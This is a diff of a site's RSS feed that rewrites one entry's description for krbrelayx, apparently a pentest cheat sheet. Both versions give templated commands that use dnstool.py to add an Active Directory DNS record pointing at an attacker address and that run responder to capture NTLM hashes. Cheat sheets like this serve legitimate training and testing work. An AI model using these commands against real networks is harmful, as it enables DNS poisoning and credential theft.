@@ -19,7 +19,7 @@
       <link>https://tldrbins.github.io/krbrelayx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/krbrelayx/</guid>
-      <description> Tools krbrelayx&#xA;Abuse #1: Add Active Directory Integrated DNS records via LDAP python3 dnstool.py -u &amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --action add --record test --data 10.10.14.10 --type A 10.10.11.10 # Capture NTLM hash sudo responder -I tun0 </description>
+      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u &amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --action add --record test --data 10.10.14.10 --type A 10.10.11.10 Ref: krbrelayx tools</description>
     </item>
     <item>
       <title>whois</title>
